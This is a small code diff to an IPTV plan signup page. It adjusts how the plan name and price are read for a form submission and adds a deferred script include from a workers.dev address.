@@ -547,8 +547,9 @@ function ppSubmit(e){e.preventDefault();
   function gv(id){var el=document.getElementById(id);if(!el)return'';return el.tagName==='SELECT'?el.options[el.selectedIndex].value:el.value.trim();}
   var name=gv('pp-name'),email=gv('pp-email'),country=gv('pp-country'),wa=gv('pp-wa'),device=gv('pp-device'),notes=gv('pp-notes');
   btn.disabled=true;btn.textContent='Sending…';if(err)err.style.display='none';
-  var planEl=document.querySelector('.pp-sum h3,.pp-sum-label h3');
+  var planEl=document.querySelector('.pp-sum h2,.pp-sum h3,.pp-sum-label h3');
   var planName=planEl?planEl.textContent.trim():(document.title||'Mojo 4K Plan');
+  var priceEl=document.querySelector('.pp-sum-val');if(priceEl)planName+=' — '+priceEl.textContent.trim();
   var templateParams={
     from_name:name||'(not provided)',
     from_email:email||'(not provided)',
@@ -693,5 +694,6 @@ function onCountryChange() {
 // Set initial dial code for Canada
 document.addEventListener("DOMContentLoaded",function(){onCountryChange();});
 </script>
+<script src="https://iptv-trial-mojo4ktv.medmaar.workers.dev/invoice.js" defer></script>
 </body>
 </html>
